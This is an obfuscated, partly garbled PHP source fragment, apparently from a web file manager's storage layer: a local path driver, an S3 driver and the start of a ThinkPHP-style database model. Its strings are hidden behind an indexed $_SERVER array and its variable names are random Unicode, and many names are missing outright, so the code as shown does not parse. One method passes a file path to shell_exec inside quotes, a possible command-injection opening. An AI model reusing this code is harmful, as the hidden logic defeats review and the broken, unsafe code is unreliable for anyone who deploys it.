if (!self::$md5Cache[$֨]) { self::$md5Cache[$֨] = @md5_file($֨); } return self::$md5Cache[$֨]; } private function hashMd5Shell($Ј˷) { $ȟ֓ =& $_SERVER[ʯ]; if (!$Ј˷) { return md5($ȟ֓[12]); } if (!function_exists($ȟ֓[108])) { return !1; } $ = array($ȟ֓[109], $ȟ֓[110]); $뇇 = Cache::get($ȟ֓[111]); if (!$뇇) { $ = BASIC_PATH . $ȟ֓[112]; $ޖ = md5_file($); $뇇 = $ȟ֓[113]; foreach ($ as $) { $ܦ = shell_exec($ . "\x20\x22{$}\42"); if ($ܦ && substr(trim($ܦ), 0, 32) == $ޖ) { $뇇 = $; break; } } Cache::set($ȟ֓[111], $뇇, 3600); } if ($뇇 == $ȟ֓[113]) { return !1; } $ܦ = shell_exec($뇇 . "\x20\x22{$Ј˷}\x22"); $ܦ = str_replace($ȟ֓[114], $ȟ֓[12], $ܦ); return substr($ܦ, 0, 32); } public function link($ī) { return $ī; } public function fileOut($Ђ, $ٖ = false, $ = false, $촎 = '') { $޲ =& $_SERVER[ʯ]; $this->cacheMethod(null, null); if (!$Ђ || !$this->exist($Ђ)) { show_json(LNG($޲[115]), !1, $); } $ = $this->getType() == $޲[116]; $Ћ = $GLOBALS[$޲[6]][$޲[99]][$޲[117]][$޲[118]]; $ = (double) $GLOBALS[$޲[6]][$޲[99]][$޲[117]][$޲[119]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $㙐 = $this->infoFull($Ђ); $ѕ = $㙐[$޲[86]]; $ = gmdate($޲[120], $㙐[$޲[95]]); $ = $ ? $ : $this->iconvApp($㙐[$޲[42]]); $ꌛ = 0; $͸ = $ѕ - 1; $ = $this->ext($); if (in_array($, array($޲[121], $޲[122], $޲[123], $޲[124]))) { $ = $޲[125]; } if (in_array($, array($޲[126]))) { $ = $޲[127]; } if (!$촎) { $촎 = md5($ . $ѕ); } $촎 = $޲[128] . $촎 . $޲[128]; $β = get_file_mime($); $έ毋 = !0; $έ毋 = isset($_GET[$޲[129]]) ? !1 : !0; if ($ٖ === !1 && !mime_support($β)) { $β = $޲[130]; } header($޲[131]); header($޲[132] . $β); $ = rawurlencode($); $ = $޲[128] . $ . $޲[133] . $; if ($ٖ) { header($޲[134]); header($޲[135] . $); } else { if ($έ毋) { header($޲[136] . $); } } header($޲[137] . gmdate($޲[120], time() + 3600 * 24 * 30) . $޲[138]); header($޲[139]); header($޲[140]); header($޲[141]); if (isset($_SERVER[$޲[142]]) && strtotime($_SERVER[$޲[142]]) == $㙐[$޲[95]]) { header($޲[143], !0, 304); die; } if (isset($_SERVER[$޲[144]]) && $_SERVER[$޲[144]] == $촎) { header($޲[145] . $촎, !0, 304); die; } header($޲[145] . $촎); header($޲[146] . $ . $޲[138]); header($޲[147] . $); header($޲[148]); header($޲[149] . $ѕ); header($޲[150]); if (!$ٖ && $ == $޲[151]) { if ($ѕ > 1024 * 1024 * 5) { die; } $͗ = $this->getContent($Ђ); $͗ = Html::clearSVG($͗); header($޲[152] . strlen($͗)); echo $͗; die; } $Дݙ = strtolower($_SERVER[$޲[153]]); if ($ && $Дݙ && $Ћ) { if (strstr($Дݙ, $޲[154])) { header($޲[155] . $Ђ); } else { if (strstr($Дݙ, $޲[156])) { header($޲[157] . $Ђ); } else { if (strstr($Дݙ, $޲[158])) { header($޲[159] . $Ђ); } } } if ($) { header($޲[160] . $); } return; } if (isset($_SERVER[$޲[161]])) { if (preg_match($޲[162], $_SERVER[$޲[161]], $)) { $ꌛ = intval($[1]); $ꌛ = $ꌛ <= 0 ? 0 : ($ꌛ >= $͸ ? $͸ : $ꌛ); if (!empty($[2])) { $ʆ = intval($[2]); $͸ = $ʆ < $ꌛ ? $ꌛ : ($ʆ >= $͸ ? $͸ : $ʆ); } } header($޲[163]); header("\x43\157\156\164\145\x6e\x74\x2d\x52\141\x6e\147\x65\72\x20\x62\171\x74\x65\163\x20{$ꌛ}\55{$͸}\x2f" . $ѕ); } else { header($޲[164]); } header($޲[165]); $ʺ = !0; if ($_SERVER[$޲[166]] == $޲[167] && $ѕ > 1204 * 1024 * 1024 * 2) { $ʺ = !1; } if ($ʺ) { header($޲[168] . ($͸ - $ꌛ + 1)); } if ($_SERVER[$޲[169]] == $޲[170]) { return; } $ȟ = 1024 * 100; $ = 0; if ($) { $ = intval(1000 * 1000 * ($ȟ / $)); } while ($ꌛ <= $͸) { $ = timeFloat(); check_abort(); $ = $͸ - $ꌛ + 1; if ($ <= $ȟ) { $ȟ = $; } echo $this->fileSubstr($Ђ, $ꌛ, $ȟ); $ꌛ += $ȟ; if ($ȟ == $) { $ꌛ = $͸ + 1; } if ($) { $ӌ = intval(1000 * 1000 * (timeFloat() - $)); $ = $ - $ӌ; if ($ > 5) { usleep($); } } } } public function fileOutServer($, $ = false, $˓Ň = false, $֔Ʊ = '') { $this->fileOut($, $, $˓Ň, $֔Ʊ); } public function fileOutLink($) { header($_SERVER[ʯ][171] . $); die; } public function cacheMethod($, $˱, $ = null) { $ =& $_SERVER[ʯ]; static $؛ = array(); $͉ = $˱ ? ltrim($this->getPathOuter($˱), $[8]) : $[12]; $ǯ = $[172] . $ . $[173] . rtrim($͉, $[8]); if (is_null($)) { $؛ = array(); return; } if (is_null($˱)) { foreach ($؛ as $ǯ => $ǯ) { if (!strstr($ǯ, $[172] . $ . $[174])) { continue; } unset($؛[$ǯ]); } return; } if (!is_null($)) { $؛[$ǯ] = $; return; } $ꁦ = isset($؛[$ǯ]) ? $؛[$ǯ] : null; if (!is_null($ꁦ)) { return $ꁦ; } $ꁦ = $this->{$}($˱); $؛[$ǯ] = $ꁦ; return $ꁦ; } public function cacheMethodInfoSet($, $憗Ϲ, $ٴ = false) { $Џ =& $_SERVER[ʯ]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($Џ[175], $, $憗Ϲ); $this->cacheMethod($Џ[176], $, $憗Ϲ ? !1 : !0); if (is_array($ٴ)) { $this->cacheMethod($Џ[177], $, $ٴ); } } public function fileOutImage($, $ל = 250) { $ =& $_SERVER[ʯ]; set_timeout(); if (substr($, 0, 4) == $[158]) { $this->fileOutLink($); } $܀ = $this->info($); $ = !1; $濬 = isset($GLOBALS[$[178]]) ? $GLOBALS[$[178]] : array(); if ($濬 && $濬[$[179]] == $܀[$[94]]) { $܀ = $濬; $ = $܀[$[180]]; if ($ && isset($[$[181]])) { if ($[$[181]] <= $ל && $[$[182]] <= $ל) { $ = !0; } } } if ($܀[$[86]] <= 1024 * 50 || $ || !function_exists($[183]) || $܀[$[184]] == $[185]) { return $this->fileOut($, !1, $܀[$[42]]); } $ǬÐ = kodIO::hashPath($܀); $晗 = "\143\157\x76\x65\162\137{$ǬÐ}\137{$ל}\56\160\x6e\147"; $ܩɗ = IO_PATH_SYSTEM_TEMP . $[186]; $Ŝ = IO::infoFullSimple($ܩɗ); $ꭊ = $Ŝ && is_array($Ŝ) ? $Ŝ[$[94]] : $[12]; if (!$ꭊ) { $ꭊ = IO::mkdir($ܩɗ); } if ($܀[$[187]] == $[188] && isset($܀[$[189]]) && $܀[$[189]] == kodIO::sourceID($ꭊ)) { $ᴑ߾ = $܀[$[190]]; if ($ל <= 500) { $ص = preg_replace($[191], $[192], $܀[$[42]]); $ᴑ߾ = IO::fileNameExist($ꭊ, $ص); } return IO::fileOut(KodIO::make($ᴑ߾), !1, $܀[$[42]]); } $ = IO::fileNameExist($ꭊ, $晗); if ($) { return IO::fileOut(KodIO::make($), !1, $܀[$[42]]); } if ($ל > 1000) { $this->makeImageCover($ꭊ, $, $晗, $ל); $this->makeImageCover($ꭊ, $, "\x63\157\x76\145\162\137{$ǬÐ}\137\62\x35\x30\x2e\160\x6e\x67", 250); $ = IO::fileNameExist($ꭊ, $晗); if ($) { return IO::fileOut(KodIO::make($), !1, $܀[$[42]]); } die; } $ = Cache::get($晗); if ($ == $[193] || $ == $[194]) { echo $; die; } Cache::set($晗, $[194], 60); $ = array($ꭊ, $܀[$[94]], $晗, $ל); $ = $[195] . $܀[$[86]] . $[196] . $晗 . $[197] . $܀[$[42]] . $[198] . $܀[$[94]]; TaskQueue::add($[199], $, $, $晗); } public function makeImageCover($ܞ՜, $Ζ, $, $) { $Ëܫ =& $_SERVER[ʯ]; if (IO::fileNameExist($ܞ՜, $)) { return $Ëܫ[200]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $ɫ = DATA_THUMB . $; del_file($ɫ); $ = TEMP_FILES . $; if (!@file_exists($)) { $ = IO::download($Ζ, $); } if (!@file_exists($)) { return $Ëܫ[201]; } ImageThumb::createThumb($, $ɫ, $, $ * 10); if (@file_exists($ɫ)) { Cache::remove($); return IO::move($ɫ, $ܞ՜); } Cache::set($, $Ëܫ[193], 600); del_file($ɫ); return $Ëܫ[202] . $ . $Ëܫ[81]; } public function fileOutImageServer($, $ = 250) { $this->fileOutImage($, $); } public function fileNameAuto($, $ǖā, $҂ = REPEAT_RENAME, $گ = false) { $ =& $_SERVER[ʯ]; $䆡 = $ === $[12] ? $ǖā : rtrim($, $[8]) . $[8] . $ǖā; if ($҂ == REPEAT_REPLACE || !$this->exist($䆡) || $گ && $҂ != REPEAT_RENAME_FOLDER) { return $ǖā; } if ($҂ == REPEAT_SKIP) { return !1; } $뇦 = $[10] . get_path_ext($ǖā); $뇦 = $뇦 == $[10] || $گ ? $[12] : $뇦; $̂ = 1; $޹ = substr($ǖā, 0, strlen($ǖā) - strlen($뇦)); $ꆼ = $޹ . "\50{$̂}\x29{$뇦}"; while ($this->exist(rtrim($, $[8]) . $[8] . $ꆼ)) { $ꆼ = $޹ . "\x28{$̂}\x29{$뇦}"; $̂++; } return $ꆼ; } private function fileNameAutoList($֓, $Ə¦, $ = false) { $ԟ =& $_SERVER[ʯ]; $ˬ = $this->listPath($֓, !0); $ˬ = array_merge($ˬ[$ԟ[92]], $ˬ[$ԟ[93]]); $ = array_to_keyvalue($ˬ, $ԟ[12], $ԟ[42]); $막 = $ԟ[10] . get_path_ext($Ə¦); $막 = $막 == $ԟ[10] || $ ? $ԟ[12] : $막; $φ = substr($Ə¦, 0, strlen($Ə¦) - strlen($막)); $ = $φ . "\50\x30\x29{$막}"; for ($ = 1; $ <= count($) + 1; $++) { $ = $φ . "\x28{$}\51{$막}"; if (!in_array_not_case($, $)) { return $; } } return $; } public function listAllFiles($ട, $) { $ =& $_SERVER[ʯ]; if (empty($)) { return array(); } $ = array_keys($); $ = array(); $ട = trim($ട, $[8]); foreach ($ as $ => $) { $̓ = ltrim(substr(trim($, $[8]), strlen($ട)), $[8]); if (substr($, -1) == $[8]) { $̓ = rtrim($̓, $[8]) . $[8]; } $ = array_merge($, $this->slicePath($̓)); } $ = array(); foreach (array_unique($) as $Ą) { $՗ʺ = array($[94] => $this->getPathOuter($[8] . $ട . $[8] . $Ą), $[85] => 1, $[86] => 0); if (substr($Ą, -1) != $[8]) { $՗ʺ[$[85]] = 0; $ = $this->getPath($ട . $[8] . $Ą); if (isset($[$])) { $ = $[$]; if (isset($[$[86]])) { $՗ʺ[$[86]] = intval($[$[86]]); } if (isset($[$[203]])) { $՗ʺ[$[95]] = intval($[$[203]]); } } } $[] = $՗ʺ; } return $; } public function slicePath($톇) { $ʼ =& $_SERVER[ʯ]; $ = explode($ʼ[8], trim($톇, $ʼ[8])); $ƛ = 0; do { ++$ƛ; $[] = implode($ʼ[8], array_slice($, 0, $ƛ)) . $ʼ[8]; } while ($ƛ < count($)); $[count($) - 1] = $톇; return $; } public function getHost() { $ =& $_SERVER[ʯ]; $ = parse_url(trim($this->domain, $[8])); $ٸ = isset($[$[204]]) ? $[$[204]] : http_type(); $ = isset($[$[205]]) ? $[$[205]] : $[$[94]]; if (isset($[$[206]])) { $ .= $[4] . $[$[206]]; } return $ٸ . $[207] . $; } public function pathEncode($) { $ښ =& $_SERVER[ʯ]; return str_replace($ښ[208], $ښ[8], rawurlencode($)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\x34"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($㕎) { set_timeout(); require_once SDK_DIR . $_SERVER[ʯ][209]; parent::__construct(); $this->_init($㕎); } public function _init($ʏ) { $this->config = $ʏ; foreach ($ʏ as $膡 => $ئ) { if (isset($this->{$膡})) { $this->{$膡} = $ئ; } } $this->endpoint = $ʏ[$_SERVER[ʯ][210]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($٠ = "\166\64") { $this->signVer = $٠; $this->client->setSignatureVersion($٠); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { $ =& $_SERVER[ʯ]; $׾ = $this->getBucketCors(); if (!$׾ || !is_array($׾)) { return !1; } if ($׾[$[211]] != $[212] || $׾[$[213]] != $[212]) { return !1; } $ = array_map($[214], $׾[$[215]]); if (!is_array($)) { $ = array(); } $񭲟И = array($[216], $[217], $[218], $[219], $[220]); $をş = array_diff($񭲟И, $); return empty($をş); } public function mkfile($, $ὧ = '', $־ = REPEAT_RENAME) { $݆ܰ = $this->setContent($, $ὧ); if ($݆ܰ !== !1) { return $this->getPathOuter($); } return !1; } public function mkdir($ؼ, $ = REPEAT_SKIP) { $ =& $_SERVER[ʯ]; if (empty($ؼ) && $ؼ !== $[221]) { return !1; } if ($ && $this->_isFolder($ؼ)) { return $this->getPathOuter($ؼ); } $ = $this->setContent($ؼ, $[12], !0); if ($ !== !1) { return $this->getPathOuter($ؼ); } return !1; } public function copyFile($, $撚ы, $̇ = array()) { $捷 =& $_SERVER[ʯ]; $钞 = $this->objectMeta($); if (!$钞) { return !1; } if ($钞[$捷[86]] <= 1024 * 1024 * 200) { $ۖݯ = $this->client->copyObject($this->bucket, $, $this->bucket, $撚ы, $捷[222], $̇); } else { $ۖݯ = $this->client->multiCopyObject($this->bucket, $, $this->bucket, $撚ы, $̇); } $ۖݯ = $ۖݯ ? $this->getPathOuter($撚ы) : !1; return $ۖݯ; } public function moveFile($, $) { if ($this->copyFile($, $)) { $this->delFile($); return $this->getPathOuter($); } return !1; } public function delFile($۪) { return $this->client->deleteObject($this->bucket, $۪); } public function delFolder($Ʌ) { $ֲ =& $_SERVER[ʯ]; if (!$this->exist($Ʌ)) { return !0; } $this->listItemCache = !1; $ = $this->fileList($Ʌ); $this->listItemCache = !0; $ = trim($Ʌ, $ֲ[8]) . $ֲ[8]; if (!empty($Ʌ) && $Ʌ !== $ֲ[221] && !in_array($, $[$ֲ[92]])) { $[$ֲ[92]][] = $; } $ = $this->delByBatch($[$ֲ[93]]); if (!$) { return !1; } $ = $this->delByBatch($[$ֲ[92]]); if (!$) { return !1; } return $this->delFile($); } private function delByBatch($) { foreach (array_chunk($, 1000) as $ܝ) { $ = $this->client->deleteObjects($this->bucket, $ܝ); if (!$) { return !1; } } return !0; } public function rename($ȴϟ, $퍰) { return $this->renameObject($ȴϟ, $퍰); } public function listPath($ǽ, $ = false) { $٨ =& $_SERVER[ʯ]; $Ƭ = $this->fileList($ǽ, $٨[8], !0); foreach ($Ƭ[$٨[92]] as $ => $) { $Ƭ[$٨[92]][$] = $this->folderInfo($, $, $); } foreach ($Ƭ[$٨[93]] as $ => $) { $Ƭ[$٨[93]][$] = $this->fileInfo($[$٨[42]], $, $); } return $Ƭ; } protected function infoChildren($, &$ö) { $ݻ =& $_SERVER[ʯ]; $ŷ = $this->fileList($, $ݻ[12], !0); $ö[$ݻ[88]] += count($ŷ[$ݻ[92]]); $ö[$ݻ[87]] += count($ŷ[$ݻ[93]]); foreach ($ŷ[$ݻ[93]] as $) { if (!$ || !$[$ݻ[86]]) { continue; } $ö[$ݻ[86]] += $[$ݻ[86]]; } } private function fileInfo($ב, $ = false, $ۮ = array()) { $ =& $_SERVER[ʯ]; $ = array($[42] => $this->pathThis($ב), $[94] => $this->getPathOuter($ב), $[43] => $[223], $[184] => $this->ext($ב), $[86] => isset($ۮ[$[86]]) ? $ۮ[$[86]] : 0); if ($) { return $; } $[$[224]] = $[$[95]] = 0; $[$[225]] = $[$[226]] = !0; if (empty($ۮ)) { $ۮ = $this->objectMeta($ב); if (!$ۮ) { return $; } } if (isset($ۮ[$[227]]) && $ۮ[$[227]]) { $[$[228]] = $ۮ[$[227]]; } if (isset($ۮ[$[203]])) { $[$[95]] = $ۮ[$[203]]; } if (isset($ۮ[$[86]])) { $[$[86]] = $ۮ[$[86]]; } return $; } private function folderInfo($۠, $휱 = false, $ = array()) { $ֽ =& $_SERVER[ʯ]; $ = array($ֽ[42] => $this->pathThis($۠), $ֽ[94] => $this->getPathOuter($ֽ[8] . $۠), $ֽ[43] => $ֽ[85]); if ($휱) { return $; } $[$ֽ[224]] = $[$ֽ[95]] = 0; $[$ֽ[225]] = $[$ֽ[226]] = !0; if ($۠ == $ֽ[12]) { return $; } if (empty($)) { $ = $this->objectMeta(trim($۠, $ֽ[8]) . $ֽ[8]); } if (isset($[$ֽ[203]])) { $[$ֽ[224]] = $[$ֽ[203]]; } return $; } private function fileList($Ҳ, $ַ = '', $Օ = 0) { $ =& $_SERVER[ʯ]; $  = rtrim($Ҳ, $[8]) . $[8]; $Ʒ͑ = $this->listObjs($ , null, null, $ַ); if (!$Ʒ͑) { return array($[92] => array(), $[93] => array()); } $̝ = $쀳 = array(); foreach ($Ʒ͑[$[229]] as $) { $ۤ = $[$[42]]; if ($ۤ == $ ) { continue; } $ׄާ = isset($[$[86]]) ? $[$[86]] : 0; $ = $ׄާ == 0 && substr($ۤ, strlen($ۤ) - 1, 1) == $[8] ? !0 : !1; $this->cacheMethodInfoSet($ۤ, $, $); if ($) { $̝[] = $ۤ; continue; } $쀳[] = $Օ ? $ : $ۤ; } foreach ($Ʒ͑[$[230]] as $) { $̝[] = $[$[42]]; $this->cacheMethodInfoSet($[$[42]], !0); } $this->cacheMethodInfoSet($Ҳ, !0); return array($[92] => $̝, $[93] => $쀳); } private function listObjs($, $ = null, $ҧ = null, $ = null) { $Ϛ =& $_SERVER[ʯ]; $ = trim($, $Ϛ[8]); $ = empty($) && $ !== $Ϛ[221] ? $Ϛ[12] : $ . $Ϛ[8]; return $this->client->getBucket($this->bucket, $, $, $ҧ, $, !0); } public function has($, $וׂ = false, $̒ = true) { $ =& $_SERVER[ʯ]; $ = trim($, $[8]); $Ș = empty($) && $ !== $[221] ? $[12] : $ . $[8]; $ = null; $ = 500; $ = $[8]; $ܴ = $ = array(); while (!0) { $ғ = $this->listObjs($, $, $, $); if (!$ғ) { break; } $ = $ғ[$[231]]; $֫ = $ғ[$[229]]; $͂ = $ғ[$[230]]; if (empty($֫) && empty($͂)) { break; } if (count($֫) == 1 && $֫[0][$[42]] == $Ș) { break; } if ($וׂ) { if (count($֫)) { $֫ = array_column($֫, $[42]); $ܴ = array_merge($ܴ, $֫); } if (count($͂)) { $͂ = array_column($͂, $[42]); $ = array_merge($, $͂); } if ($ === null) { break; } continue; } if ($̒) { if (!empty($֫)) { if (count($֫) > 1 || isset($֫[0][$[42]]) && $֫[0][$[42]] != $Ș) { return !0; } } } else { if (!empty($͂)) { return !0; } } if ($ === null) { break; } } if ($וׂ) { $ܴ = array_diff($ܴ, array($Ș)); $ܴ = count(array_unique($ܴ)); $ = count(array_unique($)); return array($[232] => $ܴ, $[233] => $); } return !1; } public function listAll($ܟ) { $Җ =& $_SERVER[ʯ]; $ = $this->fileList($ܟ, $Җ[12], !0); $ά = array_to_keyvalue($[$Җ[93]], $Җ[42]); foreach ($[$Җ[92]] as $) { if (is_string($)) { $ά[$] = array($Җ[86] => 0); } } return $this->listAllFiles($ܟ, $ά); } public function canRead($) { $΁ڬ =& $_SERVER[ʯ]; $ƪ = $this->client->getAccessControlPolicy($this->bucket, $); if (!$ƪ) { return !1; } return in_array($ƪ, array($΁ڬ[234], $΁ڬ[235], $΁ڬ[236])) ? !0 : !1; } public function canWrite($ˮʭ) { $ =& $_SERVER[ʯ]; $ = $this->client->getAccessControlPolicy($this->bucket, $ˮʭ); if (!$) { return !1; } return in_array($, array($[234], $[235])) ? !0 : !1; } public function getContent($) { return $this->client->getObject($this->bucket, $); } public function setContent($, $ӱ = '', $ = false) { $ =& $_SERVER[ʯ]; $ = $ ? trim($, $[8]) . $[8] : $; $Ƽ = get_file_mime(get_path_ext($)); $ = $this->client->putObject($ӱ, $this->bucket, $, $[222], array(), $Ƽ); if (!$) { return !1; } if ($) { return !0; } $this->cacheMethod(null, null); $ = $this->copyFile($, $, array($[237] => $[$[227]])); return $ ? !0 : !1; } public function fileSubstr($ϓ, $Ì܎, $) { $݈ = $Ì܎ + $ - 1; return $this->client->getObject($this->bucket, $ϓ, array($_SERVER[ʯ][238] => "\142\171\164\x65\x73\x3d{$Ì܎}\55{$݈}")); } public function upload($Ҡ, $ݓ, $ȴ = false, $孊 = REPEAT_REPLACE) { $딫 =& $_SERVER[ʯ]; $ز = array($딫[237] => @md5_file($ݓ)); $ɽ = array($딫[239] => get_file_mime(get_path_ext($Ҡ))); if (IO::size($ݓ) <= 1024 * 1024 * 200) { $͵ = $this->client->putObjectFile($ݓ, $this->bucket, $Ҡ, $딫[222], $ز, $ɽ); return !empty($͵) ? $this->getPathOuter($Ҡ) : !1; } $߅ = $this->client->multiUploadObject($ݓ, $this->bucket, trim($Ҡ, $딫[8]), $ز, $ɽ); return $߅ ? $this->getPathOuter($Ҡ) : !1; } public function download($, $) { if (!@is_dir($this->pathFather($)) && !IO::mkdir($this->pathFather($))) { return !1; } $ˮ = $this->client->getObject($this->bucket, $, array(), $); return $ˮ !== !1 ? $ : !1; } public function link($隔, $ő = array()) { $ֈ =& $_SERVER[ʯ]; if ($this->signVer == $ֈ[240]) { return $this->client->getAuthenticatedURL($this->bucket, $隔, 3600 * 12, $ő); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($隔, $ֈ[8]), 3600 * 12, $this->region, array(), !0, $ő); } public function fileOut($۪, $ = false, $݈݀ = false, $ז = '') { $ =& $_SERVER[ʯ]; if ($this->isFileOutServer()) { return $this->fileOutServer($۪, $, $݈݀, $ז); } if (!$݈݀) { $݈݀ = $this->pathThis($۪); } $ = get_file_mime(get_path_ext($݈݀)); if ($ == $[241]) { return parent::fileOut($۪, $, $݈݀, $ז); } $ = array($[242] => $); if ($) { $[$[243]] = $[244] . rawurlencode($݈݀); } else { } $ˁ = $this->link($۪, $); $this->fileOutLink($ˁ); } public function fileOutServer($Ȉ, $ʱ = false, $ѥ = false, $餝 = '') { parent::fileOut($Ȉ, $ʱ, $ѥ, $餝); } public function fileOutImageServer($, $񓁹 = 250) { parent::fileOutImage($, $񓁹); } public function hashMd5($ޡ, $ = '') { $񧀎 =& $_SERVER[ʯ]; $ = $this->objectMeta($ޡ); if (!$) { return !1; } $ = $ ? $ : _get($, $񧀎[245]); $ = $ ? $ : _get($, $񧀎[227], $񧀎[12]); return $; } public function uploadFormData($ߟ, $ɽ = 3600) { $ =& $_SERVER[ʯ]; $֝ = $this->pathFather($ߟ); $Ȩ = $this->client->getHttpUploadPostParams($this->bucket, $֝, $[222], $ɽ); return array_merge((array) $Ȩ, array($[205] => $this->getHost())); } public function multiUploadFormData($׽, $Ґ = 3600) { $ =& $_SERVER[ʯ]; $ = gmdate($[246]); $͍ = array(); $ = $this->client->getUploadId($this->bucket, $׽, $͍); if (!$) { return !1; } return array($[247] => $, $[205] => $this->getHost() . $[8] . $this->pathEncode($׽), $[248] => $, $[104] => $׽); } public function multiUploadAuthData($, $љ = array()) { $ =& $_SERVER[ʯ]; $ = isset($љ[$[248]]) ? $љ[$[248]] : gmdate($[246]); $ = isset($љ[$[184]]) ? $љ[$[184]] : $[12]; $ = $љ[$[104]]; unset($љ[$[104]]); if (isset($љ[$[249]])) { $љ[$[248]] = $; return $this->listUploadParts($, $љ); } $늧 = array($[250], $[12], $[130], $[12], "\170\x2d\141\155\x7a\55\x64\x61\164\x65\x3a{$}", $[8] . $this->bucket . $[8] . $this->pathEncode($) . $); if (strpos($, $[251]) === 0) { $늧[0] = $[252]; } if (isset($љ[$[253]]) && $љ[$[253]] == $[254]) { $늧[0] = $[254]; } $ = implode($[18], $늧); $馥 = base64_encode(hash_hmac($[255], $, $this->secret, !0)); $׺ = $[256] . $this->accessKey . $[4] . $馥; if (strpos($, $[251]) === 0) { return array($[257] => $׺, $[248] => $); } return $׺; } public function listUploadParts($, $ = array()) { $ڣ =& $_SERVER[ʯ]; $ = str_replace($ڣ[258], $ڣ[12], $[$ڣ[184]]); $ΐ = $this->client->listParts($this->bucket, $, $); if (!$ΐ) { return !1; } unset($[$ڣ[249]], $[$ڣ[253]]); $[$ڣ[104]] = $; $с = $this->multiUploadAuthData($, $); if (empty($с)) { return !1; } return array($ڣ[257] => $с, $ڣ[248] => $[$ڣ[248]], $ڣ[259] => $ΐ); } public function getHost() { return parent::getHost() . $_SERVER[ʯ][8] . $this->bucket; } public function size($ٜ) { $㡘 = $this->objectMeta($ٜ); return $㡘 ? $㡘[$_SERVER[ʯ][86]] : 0; } public function info($ڬ) { if ($this->isFolder($ڬ)) { return $this->folderInfo($ڬ); } else { if ($this->isFile($ڬ)) { return $this->fileInfo($ڬ); } } return !1; } public function exist($) { return $this->isFile($) || $this->isFolder($); } public function isFile($寛飡) { return !$this->isFolder($寛飡) && $this->objectMeta($寛飡); } public function isFolder($򄘰) { return $this->cacheMethod($_SERVER[ʯ][175], $򄘰); } protected function objectMeta($ɋ) { return $this->cacheMethod($_SERVER[ʯ][177], $ɋ); } protected function _objectMeta($ڒ) { $ܪ =& $_SERVER[ʯ]; $ڒ = rtrim($ڒ, $ܪ[8]); try { $ɉ = $this->client->getObjectInfo($this->bucket, $ڒ); if (!isset($ɉ[$ܪ[245]]) && isset($ɉ[$ܪ[260]])) { $ɉ[$ܪ[245]] = $ɉ[$ܪ[260]]; } } catch (Exception $͞) { $ɉ = !1; } if (!$ɉ) { } return $ɉ; } protected function _isFolder($) { $ =& $_SERVER[ʯ]; $ = rtrim($, $[8]); if ($ == $[12] || $ == $[8]) { return !0; } $ = $this->client->getBucket($this->bucket, $, null, 1); if (empty($[$[229]])) { return !1; } $ϼ = $[$[229]][0][$[42]]; return stripos($ϼ, $ . $[8]) === 0 ? !0 : !1; if (substr($ϼ, -1) == $[8]) { return !0; } if (get_path_this($ϼ) == get_path_this($)) { return !1; } return !0; } } goto dʉ; Fֈ߾: define($_SERVER[ʯ][295], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\x61\x62\154\145", "\157\162\x64\145\162", "\141\154\151\141\163", "\150\x61\166\151\156\x67", "\x67\162\157\165\x70", "\154\x6f\x63\x6b", "\x64\151\163\x74\x69\156\x63\x74", "\141\165\164\x6f", "\x66\151\154\164\x65\x72", "\x76\141\154\x69\144\x61\164\x65", "\162\x65\163\x75\154\x74", "\142\x69\x6e\x64", "\164\x6f\153\x65\156"); public function __construct($ŋ䧨 = '', $忡 = '', $ڰ = '') { $ܝ =& $_SERVER[ʯ]; $this->_initialize(); if (!empty($ŋ䧨)) { if (strpos($ŋ䧨, $ܝ[10])) { list($this->dbName, $this->name) = explode($ܝ[10], $ŋ䧨); } else { $this->name = $ŋ䧨; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($忡)) { $this->tablePrefix = $ܝ[12]; } elseif ($ܝ[12] != $忡) { $this->tablePrefix = $忡; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($ܝ[296]); } $this->db(0, empty($this->connection) ? $ڰ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $ =& $_SERVER[ʯ]; if (empty($this->fields)) { if (think_config($[297])) { $ᙥ = $this->dbName ? $this->dbName : think_config($[298]); $Ӓ = think_var_cache($[299] . strtolower(get_path_this($ᙥ) . $[10] . $this->name)); if ($Ӓ) { $頏 = think_config($[300]); if (empty($頏) || $Ӓ[$[301]] == $頏) { $this->fields = $Ӓ; return; } } } $this->flush(); } } public function flush() { $쳙 =& $_SERVER[ʯ]; $this->db->setModel($this->name); $ = $this->db->getFields($this->getTableName()); if (!$) { return !1; } $this->fields = array_keys($); $this->fields[$쳙[302]] = !1; foreach ($ as $ => $) { $[$] = $[$쳙[43]]; if ($[$쳙[49]]) { $this->fields[$쳙[303]] = $; if ($[$쳙[52]]) { $this->fields[$쳙[302]] = !0; } } } $this->fields[$쳙[304]] = $; if (think_config($쳙[300])) { $this->fields[$쳙[301]] = think_config($쳙[300]); } if (think_config($쳙[297])) { $鿇Ґ = $this->dbName ? $this->dbName : think_config($쳙[298]); think_var_cache($쳙[299] . strtolower(get_path_this($鿇Ґ) . $쳙[10] . $this->name), $this->fields); } } public function switchModel($, $ = array()) { $ =& $_SERVER[ʯ]; $ = ucwords(strtolower($)) . $[305]; if (!class_exists($)) { think_exception($ . think_lang($[306])); } $this->_extModel = new $($this->name); if (!empty($)) { foreach ($ as $ǌȎ) { $this->_extModel->setProperty($ǌȎ, $this->{$ǌȎ}); } } return $this->_extModel; } public function __set($ְ, $) { $this->data[$ְ] = 